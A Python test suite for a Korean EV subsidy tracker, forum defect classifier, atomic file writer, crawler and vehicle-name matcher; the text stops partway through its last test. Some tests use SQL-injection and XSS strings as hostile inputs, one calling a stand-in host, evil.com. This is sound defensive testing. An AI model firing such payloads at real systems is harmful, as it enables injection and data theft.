"""
tests/test_cycle25_hardening.py - Cycle 25 Hardening Adversarial Test Suite.

Authoritative Reference:
- Cycle 25 Hardening Mandate (Lead Quality Architect)
- COLLABORATION.md

Coverage Matrix (21 comprehensive tests across 5 test classes):
1. TestCycle25SubsidyCalculationExtremes (Tests 01-05):
   - test_01_subsidy_zero_quota_depletion_and_remaining: 0 quota guard, zero division safety.
   - test_02_subsidy_negative_remaining_and_negative_inputs: negative input clamping, remaining units non-negativity.
   - test_03_subsidy_100_plus_depletion_rates_and_alert_severity: 100%+ depletion percentage, DEPLETED tier assignment.
   - test_04_subsidy_invalid_and_adversarial_region_names: invalid region names, SQL/XSS in region payloads, aggregate resilience.
   - test_05_subsidy_empty_models_list_and_matrix_export_resilience: empty models matrix restoration, 18-model baseline matrix export.

2. TestCycle25DefectClassifierFuzzing (Tests 06-10):
   - test_06_defect_classifier_extreme_emoji_combinations: 100+ emoji combinations, genuine defects with emojis, pure emoji noise.
   - test_07_defect_classifier_unicode_homoglyphs_and_invisible_chars: Cyrillic lookalikes, zero-width spaces, RTL overrides, fullwidth Latin, zalgo diacritics.
   - test_08_defect_classifier_sql_xss_injection_payloads: SQL injection and XSS payloads in title, content, author, url.
   - test_09_defect_classifier_empty_string_and_whitespace: empty string and whitespace-only post handling across all 4 stages.
   - test_10_defect_classifier_none_post_and_null_attributes: None post and None attributes defensive handling.

3. TestCycle25AtomicWriterConcurrencyAndResilience (Tests 11-14):
   - test_11_concurrent_writes_same_destination_integrity: multi-threaded concurrent writes to the same destination file.
   - test_12_read_while_write_zero_corruption: simultaneous reader and writer threads proving zero JSONDecodeErrors and zero partial reads.
   - test_13_permission_preservation_existing_modes_and_override: POSIX mode 0o600, 0o640 preservation, and explicit mode override.
   - test_14_atomic_write_multiple_and_cleanup_resilience: multi-destination atomic write and stale temp file unlinking.

4. TestCycle25CrawlerResilienceSimulation (Tests 15-18):
   - test_15_simulated_429_rate_limit_retry_after_and_recovery: 429 Too Many Requests with Retry-After header parsing and backoff recovery.
   - test_16_simulated_persistent_429_rate_limit_graceful_exhaustion: persistent 429 exhaustion without unhandled exceptions.
   - test_17_partial_http_reads_and_timeout_recovery: IncompleteRead and timeout recovery returning safe fallback tuples.
   - test_18_malformed_html_parsing_without_crashes: corrupted DOMs, null bytes, unclosed tags, and encoding mismatches.

5. TestCycle25VehicleMatcherEdgeCases (Tests 19-21):
   - test_19_mixed_korean_english_slang_matching: mixed Korean-English slang terms for Hyundai, Kia, Tesla, BYD, and Other.
   - test_20_partial_model_names_and_distinctions: partial model names, sub-model distinctions (EV6 vs EV6 GT, Model 3 vs BMW M3).
   - test_21_case_insensitivity_matrix: complete case insensitivity across uppercase, lowercase, and title case.
"""

from __future__ import annotations

import concurrent.futures
import http.client
import io
import json
import math
import os
from pathlib import Path
import stat
import sys
import tempfile
import time
from typing import Any, Dict, List, Optional
import unittest
from unittest import mock
import urllib.error
import urllib.request

# Ensure repo root is on sys.path
PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

# Module imports
from crawlers.base_crawler import BaseCrawler
from crawlers.bobaedream import BobaeDreamCrawler
from crawlers.dcinside import DCInsideCrawler
from filters.defect_classifier import DefectClassifier
from filters.vehicle_matcher import (
    BRAND_BYD,
    BRAND_HYUNDAI,
    BRAND_KIA,
    BRAND_OTHER,
    BRAND_TESLA,
    VehicleMatcher,
    extract_vehicle_info,
)
from models.complaint import ComplaintRecord, RawPost
from tracker.atomic_writer import (
    FileLock,
    atomic_write_json,
    atomic_write_json_multiple,
    cleanup_stale_temp_files,
    get_lock_path,
    quarantine_corrupted_file,
    sanitize_nan_inf,
)
from tracker.subsidy_baseline import (
    COMMERCIAL_NATIONAL_CAP_KRW,
    DEFAULT_ALERT_THRESHOLDS,
    PASSENGER_NATIONAL_CAP_KRW,
    build_initial_baseline,
    build_popular_models,
)
from tracker.subsidy_models import AlertSeverity, CategoryMetrics, RegionRecord, SubsidyPayload
from tracker.subsidy_tracker import (
    SubsidyTracker,
    build_comprehensive_models_matrix,
    calculate_depletion_rate,
    calculate_net_subsidy,
    calculate_price_cap_ratio,
    calculate_remaining_units,
    classify_alert_tier,
    export_models_subsidy_matrix,
)
from utils.http_client import SafeHttpClient, clean_html_text, robust_decode


# ===========================================================================
# 1. Subsidy Calculation Extremes
# ===========================================================================
class TestCycle25SubsidyCalculationExtremes(unittest.TestCase):
    """Exhaustive boundary testing for subsidy calculations under extreme conditions."""

    def setUp(self) -> None:
        self.tracker = SubsidyTracker()
        self.tmp_dir = tempfile.TemporaryDirectory()
        self.test_dir = Path(self.tmp_dir.name)

    def tearDown(self) -> None:
        try:
            self.tmp_dir.cleanup()
        except OSError:
            pass

    def test_01_subsidy_zero_quota_depletion_and_remaining(self) -> None:
        """When announced quota is 0, depletion rate is 0.0 and remaining units are 0 without ZeroDivisionError."""
        # Function level zero division protection
        self.assertEqual(calculate_depletion_rate(applied=100, announced=0), 0.0)
        self.assertEqual(calculate_depletion_rate(applied=0, announced=0), 0.0)
        self.assertEqual(calculate_depletion_rate(applied=0.0, announced=0.0), 0.0)
        self.assertEqual(calculate_remaining_units(applied=100, announced=0), 0)
        self.assertEqual(calculate_remaining_units(applied=0, announced=0), 0)

        # 0.0% rate classification
        self.assertEqual(classify_alert_tier(0.0), "HEALTHY")

        # Category metrics with 0 quota
        metrics = self.tracker.calculate_category_metrics(
            announced=0,
            applied=50,
            delivered=20,
            max_local_subsidy=5_000_000,
            national_cap=PASSENGER_NATIONAL_CAP_KRW,
        )
        self.assertIsInstance(metrics, CategoryMetrics)
        self.assertEqual(metrics.announced_units, 0)
        self.assertEqual(metrics.applied_units, 50)
        self.assertEqual(metrics.remaining_units, 0)
        self.assertEqual(metrics.depletion_rate, 0.0)
        self.assertEqual(metrics.delivery_rate, 0.0)
        self.assertEqual(metrics.total_budget_krw, 0)
        self.assertEqual(metrics.remaining_budget_krw, 0)
        self.assertEqual(metrics.status, "HEALTHY")

    def test_02_subsidy_negative_remaining_and_negative_inputs(self) -> None:
        """Negative announced or applied inputs are clamped to non-negative values and remaining units never drop below 0."""
        # Negative inputs to depletion rate return 0.0
        self.assertEqual(calculate_depletion_rate(-100, 1000), 0.0)
        self.assertEqual(calculate_depletion_rate(1000, -100), 0.0)
        self.assertEqual(calculate_depletion_rate(-50, -50), 0.0)

        # Remaining units calculation clamps negative values safely
        self.assertEqual(calculate_remaining_units(applied=-50, announced=100), 100)
        self.assertEqual(calculate_remaining_units(applied=150, announced=100), 0)
        self.assertEqual(calculate_remaining_units(applied=100, announced=-50), 0)
        self.assertEqual(calculate_remaining_units(applied=-100, announced=-100), 0)

        # Net subsidy calculation with negative inputs
        net_sub = calculate_net_subsidy(
            model_national=-1000,
            max_national=-5000,
            max_local=-2000,
            msrp=-50_000_000,
        )
        self.assertEqual(net_sub["national_subsidy_krw"], 0)
        self.assertEqual(net_sub["local_subsidy_krw"], 0)
        self.assertEqual(net_sub["total_subsidy_krw"], 0)
        self.assertEqual(net_sub["net_price_krw"], 0)
        self.assertEqual(net_sub["price_cap_ratio"], 0.0)

        # Category metrics with negative numbers
        neg_metrics = self.tracker.calculate_category_metrics(
            announced=-500,
            applied=-200,
            delivered=-100,
            max_local_subsidy=-1_000_000,
        )
        self.assertEqual(neg_metrics.announced_units, 0)
        self.assertEqual(neg_metrics.applied_units, 0)
        self.assertEqual(neg_metrics.delivered_units, 0)
        self.assertEqual(neg_metrics.remaining_units, 0)
        self.assertEqual(neg_metrics.depletion_rate, 0.0)
        self.assertEqual(neg_metrics.total_budget_krw, 0)
        self.assertEqual(neg_metrics.remaining_budget_krw, 0)

    def test_03_subsidy_100_plus_depletion_rates_and_alert_severity(self) -> None:
        """Over-subscribed subsidies (>= 100%) evaluate correctly and map strictly to DEPLETED status."""
        rates_and_expected = [
            (100, 100, 100.0, "DEPLETED"),
            (101, 100, 101.0, "DEPLETED"),
            (150, 100, 150.0, "DEPLETED"),
            (300, 100, 300.0, "DEPLETED"),
            (1000, 100, 1000.0, "DEPLETED"),
        ]

        for applied, announced, exp_rate, exp_tier in rates_and_expected:
            actual_rate = calculate_depletion_rate(applied, announced)
            self.assertEqual(actual_rate, exp_rate)
            self.assertEqual(calculate_remaining_units(applied, announced), 0)
            self.assertEqual(classify_alert_tier(actual_rate), exp_tier)

        # Region update with over-subscribed category
        region_payload = {
            "region_id": "test_over",
            "region_name": "초과소진지역",
            "categories": {
                "passenger": {
                    "announced_units": 1000,
                    "applied_units": 1250,
                    "delivered_units": 1000,
                    "total_budget_krw": 10_000_000_000,
                    "remaining_budget_krw": 0,
                }
            },
        }
        updated = self.tracker.update_region_metrics(region_payload)
        cat = updated["categories"]["passenger"]
        self.assertEqual(cat["depletion_rate"], 125.0)
        self.assertEqual(cat["remaining_units"], 0)
        self.assertEqual(cat["remaining_budget_krw"], 0)
        self.assertEqual(cat["status"], "DEPLETED")
        self.assertEqual(updated["overall_depletion_rate"], 125.0)
        self.assertEqual(updated["overall_status"], "DEPLETED")

    def test_04_subsidy_invalid_and_adversarial_region_names(self) -> None:
        """Invalid, empty, and injection-laden region names are handled gracefully without exceptions."""
        adversarial_regions = [
            {"region_id": "inv_1", "region_name": "", "categories": {}},
            {"region_id": "inv_2", "region_name": None, "categories": {}},
            {"region_id": "inv_3", "region_name": "'; DROP TABLE regions; --", "categories": {}},
            {"region_id": "inv_4", "region_name": "<script>alert('xss')</script>", "categories": {}},
            {"region_id": "inv_5", "region_name": "NonExistentRegion99", "categories": {}},
        ]

        for reg in adversarial_regions:
            updated = self.tracker.update_region_metrics(reg)
            self.assertEqual(updated.get("overall_depletion_rate"), 0.0)
            self.assertEqual(updated.get("overall_status"), "HEALTHY")

        # Nationwide summary handles mixture of valid and invalid region dicts
        valid_region = {
            "region_id": "seoul",
            "region_name": "서울특별시",
            "overall_status": "WARNING",
            "categories": {
                "passenger": {
                    "announced_units": 1000,
                    "applied_units": 850,
                    "delivered_units": 800,
                    "total_budget_krw": 10_000_000_000,
                    "remaining_budget_krw": 1_500_000_000,
                }
            },
        }
        summary = self.tracker.compute_nationwide_summary([valid_region] + adversarial_regions)
        self.assertEqual(summary.total_announced_units, 1000)
        self.assertEqual(summary.total_applied_units, 850)
        self.assertEqual(summary.total_delivered_units, 800)
        self.assertEqual(summary.total_remaining_units, 150)
        self.assertEqual(summary.nationwide_depletion_rate, 85.0)
        self.assertEqual(summary.alert_region_counts["warning"], 1)

    def test_05_subsidy_empty_models_list_and_matrix_export_resilience(self) -> None:
        """When models list is empty, tracking cycle restores baseline models and matrix export succeeds."""
        # execute_tracking_cycle with empty models matrix in fallback payload restores baseline
        payload, is_fallback = self.tracker.execute_tracking_cycle(mock_network_failure=True)
        self.assertTrue(is_fallback)
        self.assertGreater(len(payload.popular_models_matrix), 0)

        # build_comprehensive_models_matrix returns 18 models
        matrix = build_comprehensive_models_matrix()
        self.assertIsInstance(matrix, list)
        self.assertEqual(len(matrix), 18)
        for m in matrix:
            self.assertIn("model_id", m)
            self.assertIn("price_subsidy_ratio", m)
            self.assertIn(m["price_subsidy_ratio"], [1.0, 0.5, 0.0])

        # export_models_subsidy_matrix to temp directory
        written = export_models_subsidy_matrix(target_dirs=[self.test_dir])
        self.assertEqual(len(written), 1)
        self.assertTrue(written[0].exists())
        with open(written[0], "r", encoding="utf-8") as f:
            exported_data = json.load(f)
        self.assertEqual(len(exported_data), 18)


# ===========================================================================
# 2. Defect Classifier Fuzzing
# ===========================================================================
class TestCycle25DefectClassifierFuzzing(unittest.TestCase):
    """Adversarial NLP fuzzing across emojis, unicode homoglyphs, SQL/XSS, and empty/None posts."""

    def setUp(self) -> None:
        self.classifier = DefectClassifier()

    def test_06_defect_classifier_extreme_emoji_combinations(self) -> None:
        """Classifier survives extreme emoji strings without regex backtracking or unexpected crashes."""
        # 1. 200+ pure emojis should fail Stage 2 ownership (not an authentic complaint)
        pure_emojis = "🔥" * 100 + "🚨" * 50 + "⚡️" * 50 + "💣💥💀"
        post_pure = RawPost(post_id="emoji_1", title=pure_emojis, content=pure_emojis, author="emoji_bot")
        rec_pure = self.classifier.process_post(post_pure)
        self.assertFalse(rec_pure.is_authentic_defect)
        self.assertEqual(rec_pure.severity_index, 0.0)

        # 2. Genuine defect complaint decorated with heavy warning emojis
        auth_text = "아이오닉5 차주인데 주행 중 배터리 불나서 식겁함 🔥🔥🔥🚨🚨🚨"
        auth_content = "고속도로 주행 중에 갑자기 경고등 들어오면서 동력 상실되고 시동 꺼졌습니다. 죽을 뻔했네요 ㅠㅠ"
        post_auth = RawPost(
            post_id="emoji_2",
            title=auth_text,
            content=auth_content,
            author="오너123",
        )
        rec_auth = self.classifier.process_post(post_auth)
        self.assertTrue(rec_auth.is_authentic_defect)
        self.assertEqual(rec_auth.vehicle_brand, BRAND_HYUNDAI)
        self.assertEqual(rec_auth.vehicle_model, "아이오닉5")
        self.assertEqual(rec_auth.defect_category, "BATTERY_CHARGING")
        self.assertGreaterEqual(rec_auth.severity_index, 8.0)

        # 3. Commercial stock/crypto spam with emojis is rejected at Stage 1
        spam_post = RawPost(
            post_id="emoji_3",
            title="🔥🔥🔥 텔레그램 주식 리딩방 무료 입장 종목 추천 🚀🚀🚀",
            content="급등주 매일 무료 추천 100% 수익 보장 https://t.me/spam",
            author="스패머",
        )
        rec_spam = self.classifier.process_post(spam_post)
        self.assertFalse(rec_spam.is_authentic_defect)
        self.assertIn("Stage 1", rec_spam.summary)

    def test_07_defect_classifier_unicode_homoglyphs_and_invisible_chars(self) -> None:
        """Classifier safely parses Cyrillic homoglyphs, zero-width spaces, RTL marks, and fullwidth Latin."""
        # Invisible characters & Cyrillic lookalikes
        # U+200B (Zero-width space), U+200C (ZWNJ), U+202E (RTL override), U+0435 (Cyrillic 'е')
        homoglyph_post = RawPost(
            post_id="hg_1",
            title="아이\u200b오닉\u200c5\ufeff 차주\u202e인증 주행 중 배\u0435터리 결함",
            content="주행 중에 모터 고장나서 멈췄습니다. \uff29\uff2f\uff2e\uff29\uff31 단차 심각",
            author="테스터",
        )
        rec_hg = self.classifier.process_post(homoglyph_post)
        self.assertIsInstance(rec_hg, ComplaintRecord)
        self.assertIn(rec_hg.vehicle_brand, [BRAND_HYUNDAI, BRAND_OTHER])

        # Zalgo / heavy combining character stack
        zalgo_title = "차주인\u0300\u0301\u0302\u0303\u0304\u0305데 주행 중 고장\u0330\u0331\u0332"
        zalgo_content = "모터 소음과 진동\u0320\u0321\u0322이 너무 심합니다."
        post_zalgo = RawPost(post_id="hg_2", title=zalgo_title, content=zalgo_content, author="zalgo")
        rec_zalgo = self.classifier.process_post(post_zalgo)
        self.assertIsInstance(rec_zalgo, ComplaintRecord)

    def test_08_defect_classifier_sql_xss_injection_payloads(self) -> None:
        """SQL and XSS payloads in title, content, author, or comments do not cause syntax errors or injection."""
        sql_xss_post = RawPost(
            post_id="sql_1",
            title="<script>alert('xss')</script> '; DROP TABLE defect_reports; --",
            content="<img src=x onerror=alert('xss')> ' OR '1'='1' -- 1=1",
            author="<svg/onload=fetch('//evil.com')>",
            url="javascript:alert(1)",
            comments=["<iframe src=javascript:alert(2)>", "UNION SELECT username, password FROM users--"],
        )
        rec = self.classifier.process_post(sql_xss_post)
        self.assertIsInstance(rec, ComplaintRecord)

        # Serialization to JSON must remain valid RFC 8259 JSON
        record_dict = rec.to_dict()
        json_output = json.dumps(record_dict, ensure_ascii=False)
        parsed_back = json.loads(json_output)
        self.assertEqual(parsed_back["id"], "sql_1")
        self.assertIn("<script>", parsed_back["title"])

    def test_09_defect_classifier_empty_string_and_whitespace(self) -> None:
        """Empty and whitespace-only text inputs gracefully yield non-authentic ComplaintRecord."""
        empty_posts = [
            RawPost(post_id="emp_1", title="", content="", author=""),
            RawPost(post_id="emp_2", title="   \t\n  ", content="   \r\n  ", author="   "),
        ]

        for p in empty_posts:
            rec = self.classifier.process_post(p)
            self.assertIsInstance(rec, ComplaintRecord)
            self.assertFalse(rec.is_authentic_defect)
            self.assertEqual(rec.severity_index, 0.0)

        # Direct stage helper resilience
        self.assertEqual(self.classifier.evaluate_stage2_ownership("")[0], False)
        self.assertEqual(self.classifier.classify_defect_category(""), "BUILD_QUALITY")
        dsi_score, breakdown = self.classifier.compute_dsi("", "BUILD_QUALITY")
        self.assertGreaterEqual(dsi_score, 0.0)
        self.assertLessEqual(dsi_score, 10.0)

    def test_10_defect_classifier_none_post_and_null_attributes(self) -> None:
        """Passing None post or post with null attributes returns safe default ComplaintRecord without crash."""
        rec_none = self.classifier.process_post(None)
        self.assertIsInstance(rec_none, ComplaintRecord)
        self.assertFalse(rec_none.is_authentic_defect)

        null_post = RawPost(
            post_id=None,  # type: ignore
            title=None,  # type: ignore
            content=None,  # type: ignore
            author=None,  # type: ignore
            url=None,  # type: ignore
            comments=None,  # type: ignore
        )
        rec_null = self.classifier.process_post(null_post)
        self.assertIsInstance(rec_null, ComplaintRecord)
        self.assertFalse(rec_null.is_authentic_defect)

        # Single string comments defensively guarded (not split into characters)
        single_str_comment_post = RawPost(
            post_id="str_c",
            title="테스트 제목",
            content="테스트 본문",
            comments="단일 댓글 문자열",  # string instead of list
        )
        rec_str = self.classifier.process_post(single_str_comment_post)
        self.assertIsInstance(rec_str, ComplaintRecord)


# ===========================================================================
# 3. Atomic Writer Concurrency & Resilience
# ===========================================================================
class TestCycle25AtomicWriterConcurrencyAndResilience(unittest.TestCase):
    """Multi-threaded concurrent write and read-while-write durability verification."""

    def setUp(self) -> None:
        self.tmp_dir = tempfile.TemporaryDirectory()
        self.test_dir = Path(self.tmp_dir.name)

    def tearDown(self) -> None:
        try:
            self.tmp_dir.cleanup()
        except OSError:
            pass

    def test_11_concurrent_writes_same_destination_integrity(self) -> None:
        """Multiple threads concurrently writing to the exact same destination produce 100% valid JSON."""
        target_file = self.test_dir / "concurrent_target.json"
        num_threads = 8
        iterations_per_thread = 15

        def writer_worker(thread_id: int) -> None:
            for i in range(iterations_per_thread):
                payload = {
                    "thread_id": thread_id,
                    "iteration": i,
                    "timestamp": time.time(),
                    "data": [x for x in range(50)],
                }
                atomic_write_json(payload, target_file)

        with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(writer_worker, tid) for tid in range(num_threads)]
            for fut in concurrent.futures.as_completed(futures):
                fut.result()

        self.assertTrue(target_file.exists())
        with open(target_file, "r", encoding="utf-8") as f:
            final_data = json.load(f)
        self.assertIn("thread_id", final_data)
        self.assertIn("iteration", final_data)
        self.assertEqual(len(final_data["data"]), 50)

    def test_12_read_while_write_zero_corruption(self) -> None:
        """Simultaneous reader threads continuously reading an actively overwritten file encounter 0 JSON errors."""
        target_file = self.test_dir / "read_while_write.json"
        atomic_write_json({"counter": -1, "body": "initial seed"}, target_file)

        stop_event = False
        json_decode_errors: List[str] = []
        valid_reads = 0

        def writer_loop() -> None:
            for i in range(80):
                payload = {"counter": i, "body": "X" * 2000, "ts": time.time()}
                atomic_write_json(payload, target_file)
                time.sleep(0.0005)

        def reader_loop() -> None:
            nonlocal valid_reads
            for _ in range(150):
                try:
                    with open(target_file, "r", encoding="utf-8") as f:
                        d = json.load(f)
                        self.assertIsInstance(d, dict)
                        self.assertIn("counter", d)
                        valid_reads += 1
                except Exception as ex:
                    json_decode_errors.append(str(ex))
                time.sleep(0.0002)

        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            w_fut = executor.submit(writer_loop)
            r_futs = [executor.submit(reader_loop) for _ in range(4)]
            w_fut.result()
            for rf in r_futs:
                rf.result()

        self.assertEqual(
            len(json_decode_errors),
            0,
            f"Read-while-write encountered JSON decode errors: {json_decode_errors}",
        )
        self.assertGreater(valid_reads, 100)

    def test_13_permission_preservation_existing_modes_and_override(self) -> None:
        """atomic_write_json retains custom POSIX permissions (0o600, 0o640) and allows explicit overrides."""
        # 1. 0o600 private permissions
        target_600 = self.test_dir / "secure_payload.json"
        target_600.write_text(json.dumps({"secret": True}), encoding="utf-8")
        os.chmod(target_600, 0o600)
        self.assertEqual(target_600.stat().st_mode & 0o777, 0o600)

        written_600 = atomic_write_json({"secret": True, "updated": 1}, target_600, preserve_permissions=True)
        self.assertEqual(written_600.stat().st_mode & 0o777, 0o600)

        # 2. 0o640 group permissions
        target_640 = self.test_dir / "group_payload.json"
        target_640.write_text(json.dumps({"group": True}), encoding="utf-8")
        os.chmod(target_640, 0o640)
        self.assertEqual(target_640.stat().st_mode & 0o777, 0o640)

        written_640 = atomic_write_json({"group": True, "v": 2}, target_640, preserve_permissions=True)
        self.assertEqual(written_640.stat().st_mode & 0o777, 0o640)

        # 3. Explicit mode override overrides existing permissions
        written_override = atomic_write_json({"override": True}, target_600, mode=0o644)
        self.assertEqual(written_override.stat().st_mode & 0o777, 0o644)

    def test_14_atomic_write_multiple_and_cleanup_resilience(self) -> None:
        """atomic_write_json_multiple writes to all paths and stale temp file cleaner safely unlinks orphans."""
        p1 = self.test_dir / "multi_1.json"
        p2 = self.test_dir / "multi_2.json"
        written = atomic_write_json_multiple({"multi": True}, [p1, p2])
        self.assertEqual(len(written), 2)
        self.assertTrue(p1.exists() and p2.exists())

        # Cleanup stale temp files
        orphan = self.test_dir / ".tmp_subsidy_orphan.json"
        orphan.write_text("{}", encoding="utf-8")
        # Backdate mtime by 2 hours
        old_time = time.time() - 7200
        os.utime(orphan, (old_time, old_time))
        cleaned = cleanup_stale_temp_files(self.test_dir, prefix=".tmp_subsidy_", max_age_seconds=3600.0)
        self.assertEqual(cleaned, 1)
        self.assertFalse(orphan.exists())


# ===========================================================================
# 4. Crawler Resilience Simulation
# ===========================================================================
class TestCycle25CrawlerResilienceSimulation(unittest.TestCase):
    """Simulated HTTP 429 rate limits, partial reads, and malformed HTML parsing."""

    def test_15_simulated_429_rate_limit_retry_after_and_recovery(self) -> None:
        """SafeHttpClient catches HTTP 429, parses Retry-After, executes backoff, and succeeds on retry."""
        class Mock429WithRecoveryOpener:
            def __init__(self) -> None:
                self.calls = 0

            def open(self, req: urllib.request.Request, timeout: float = 15.0) -> Any:
                self.calls += 1
                if self.calls <= 2:
                    hdrs = {"Retry-After": "0.01", "Content-Type": "text/html"}
                    fp = io.BytesIO(b"429 Too Many Requests")
                    raise urllib.error.HTTPError(req.full_url, 429, "Too Many Requests", hdrs, fp)

                class Mock200Success:
                    def getcode(self) -> int:
                        return 200

                    @property
                    def headers(self) -> Dict[str, str]:
                        return {"Content-Type": "text/html; charset=utf-8"}

                    def read(self, n: int = 65536) -> bytes:
                        return b"<html><body>OK Success</body></html>"

                    def __enter__(self) -> Any:
                        return self

                    def __exit__(self, *args: Any) -> None:
                        pass

                return Mock200Success()

        with mock.patch("time.sleep") as mock_sleep:
            opener = Mock429WithRecoveryOpener()
            client = SafeHttpClient(max_retries=3, enable_jitter=False, opener=opener)
            status, text, raw = client.request("https://forum.example.com/posts/100")

            self.assertEqual(status, 200)
            self.assertIn("OK Success", text)
            self.assertEqual(opener.calls, 3)
            self.assertGreaterEqual(mock_sleep.call_count, 2)

    def test_16_simulated_persistent_429_rate_limit_graceful_exhaustion(self) -> None:
        """Persistent HTTP 429 returns status 429 and BaseCrawler.fetch_post returns None without crashing."""
        class MockPermanent429Opener:
            def open(self, req: urllib.request.Request, timeout: float = 15.0) -> Any:
                hdrs = {"Retry-After": "0.01", "Content-Type": "text/html"}
                fp = io.BytesIO(b"Persistent Rate Limit")
                raise urllib.error.HTTPError(req.full_url, 429, "Too Many Requests", hdrs, fp)

        with mock.patch("time.sleep"):
            client = SafeHttpClient(max_retries=2, enable_jitter=False, opener=MockPermanent429Opener())
            status, text, raw = client.request("https://forum.example.com/posts/blocked")
            self.assertEqual(status, 429)
            self.assertIn("Persistent Rate Limit", text)

            # BaseCrawler fetch_post returns None on status 429
            class ConcreteCrawler(BaseCrawler):
                def parse_post_detail(self, html_content: str, post_url: str, **kwargs: Any) -> Dict[str, Any]:
                    return {"url": post_url}

            crawler = ConcreteCrawler(client=client)
            result = crawler.fetch_post("https://forum.example.com/posts/blocked")
            self.assertIsNone(result)

    def test_17_partial_http_reads_and_timeout_recovery(self) -> None:
        """Partial socket reads (IncompleteRead) and timeouts trigger retries and graceful fallback tuples."""
        class MockIncompleteReadOpener:
            def open(self, req: urllib.request.Request, timeout: float = 15.0) -> Any:
                raise http.client.IncompleteRead(b"partial byte stream", 100)

        with mock.patch("time.sleep"):
            client = SafeHttpClient(max_retries=2, enable_jitter=False, opener=MockIncompleteReadOpener())
            status, text, raw = client.request("https://forum.example.com/partial")
            self.assertEqual(status, 0)
            self.assertEqual(text, "")
            self.assertEqual(raw, b"")

    def test_18_malformed_html_parsing_without_crashes(self) -> None:
        """clean_html_text, robust_decode, and forum crawlers handle corrupted HTML, null bytes, and broken tags."""
        corrupted_html = """
        <html><body>
        <div class="write_div" style="overflow:hidden;">
            \x00\x00\x00
            <p>Broken tag <b>unclosed tag
            <script>alert("hidden attack"); var unclosed = 1;
            <table><tr><td>Cell 1</td>
            <a href="https://example.com">Broken Link
        </div>
        """
        # clean_html_text
        cleaned = clean_html_text(corrupted_html)
        self.assertIn("Broken tag", cleaned)
        self.assertNotIn("\x00", cleaned)
        self.assertNotIn("alert", cleaned)

        # robust_decode with invalid bytes
        garbage_bytes = b"Hello \xff\xfe World \x80\x81\x82"
        decoded = robust_decode(garbage_bytes)
        self.assertIn("Hello", decoded)

        # DCInside & BobaeDream crawlers on corrupted HTML
        dc = DCInsideCrawler()
        detail_dc = dc.parse_post_detail(corrupted_html, "https://gall.dcinside.com/board/view/?id=car_new11&no=123")
        self.assertIsInstance(detail_dc, dict)
        self.assertIn("content", detail_dc)

        bd = BobaeDreamCrawler()
        detail_bd = bd.parse_post_detail(corrupted_html, "https://www.bobaedream.co.kr/view?code=national&No=123")
        self.assertIsInstance(detail_bd, dict)
        self.assertIn("content", detail_bd)


# ===========================================================================
# 5. Vehicle Matcher Edge Cases
# ===========================================================================
class TestCycle25VehicleMatcherEdgeCases(unittest.TestCase):
    """Mixed Korean-English slang, partial model names, and case insensitivity verification."""

    def test_19_mixed_korean_english_slang_matching(self) -> None:
        """Vehicle matcher correctly identifies brand and model from mixed Korean and English slang."""
        slang_cases = [
            ("테슬람 my rwd 출고함 승차감 어떰", BRAND_TESLA, "Model Y"),
            ("흉기차 ioniq5 고속도로에서 멈춤", BRAND_HYUNDAI, "아이오닉5"),
            ("개슬라 m3 highland 대기 중", BRAND_TESLA, "Model 3 Highland"),
            ("기아차 ev6 gt 와인딩 시승기", BRAND_KIA, "EV6 GT"),
            ("비야디 atto3 짱차 가성비 갑", BRAND_BYD, "Atto 3"),
            ("현기충 아이오닉 6 N 배터리 결함", BRAND_HYUNDAI, "아이오닉6 N"),
            ("개스라 my juniper 언제 나옴?", BRAND_TESLA, "Model Y Juniper"),
            ("흉기 casper ev 귀엽다", BRAND_HYUNDAI, "캐스퍼 일렉트릭"),
            ("포르쉐 taycan 충전 먹통", BRAND_OTHER, "타이칸"),
            ("비야디 seal ev 배터리 블레이드", BRAND_BYD, "씰"),
            ("짱차 돌핀 사전계약 언제임?", BRAND_BYD, "돌핀"),
            ("개슬라 사이버트럭 직구 인증", BRAND_TESLA, "Cybertruck"),
        ]

        for title, exp_brand, exp_model in slang_cases:
            brand, model = extract_vehicle_info(title)
            self.assertEqual(brand, exp_brand, f"Brand mismatch for '{title}' (got {brand})")
            self.assertEqual(model, exp_model, f"Model mismatch for '{title}' (got {model})")

    def test_20_partial_model_names_and_distinctions(self) -> None:
        """Partial model names correctly resolve without collision between Tesla, BMW, and Korean brands."""
        distinction_cases = [
            # Ioniq brand and variants
            ("아이오닉 주행기", BRAND_HYUNDAI, "아이오닉"),
            ("아이오닉 EV 충전 속도", BRAND_HYUNDAI, "아이오닉"),
            ("아이오닉 전기차 보조금", BRAND_HYUNDAI, "아이오닉"),
            ("ioniq 시승 후기", BRAND_HYUNDAI, "아이오닉"),
            # Hyundai/Kia EVs
            ("코나 EV 배터리 교환", BRAND_HYUNDAI, "코나 EV"),
            ("캐스퍼 일렉트릭 사전계약", BRAND_HYUNDAI, "캐스퍼 일렉트릭"),
            ("레이 EV 경차 혜택", BRAND_KIA, "레이 EV"),
            ("포터 EV 화물차 보조금", BRAND_HYUNDAI, "포터 EV"),
            ("봉고 EV 적재함 크기", BRAND_KIA, "봉고 EV"),
            # M3 distinction: Tesla Model 3 vs BMW M3
            ("m3 rwd 인도받았습니다", BRAND_TESLA, "Model 3"),
            ("bmw m3 컴페티션 배기음", BRAND_OTHER, "BMW M3"),
            ("비엠 M3 서스펜션 튜닝", BRAND_OTHER, "BMW M3"),
            # Kia EV series distinctions
            ("ev6 타고 출퇴근", BRAND_KIA, "EV6"),
            ("ev6 gt 서킷 랩타임", BRAND_KIA, "EV6 GT"),
            ("ev9 롱레인지 패밀리카", BRAND_KIA, "EV9"),
            ("ev9 gt 라인 옵션", BRAND_KIA, "EV9 GT"),
            ("기아 ev3 실내 공간", BRAND_KIA, "EV3"),
            ("기아 ev2 예상 렌더링", BRAND_KIA, "EV2"),
        ]

        for title, exp_brand, exp_model in distinction_cases:
            brand, model = VehicleMatcher.match(title)
            self.assertEqual(brand, exp_brand, f"Brand mismatch for '{title}' (got {brand})")
            self.assertEqual(model, exp_model, f"Model mismatch for '{title}' (got {model})")

    def test_21_case_insensitivity_matrix(self) -> None:
        """VehicleMatcher exhibits 100% case-insensitivity across uppercase, lowercase, and title case."""
        case_matrix = [
            # Upper, Lower, Mixed
            ("IONIQ 5 N 서킷", BRAND_HYUNDAI, "아이오닉5 N"),
            ("ioniq 5 n 서킷", BRAND_HYUNDAI, "아이오닉5 N"),
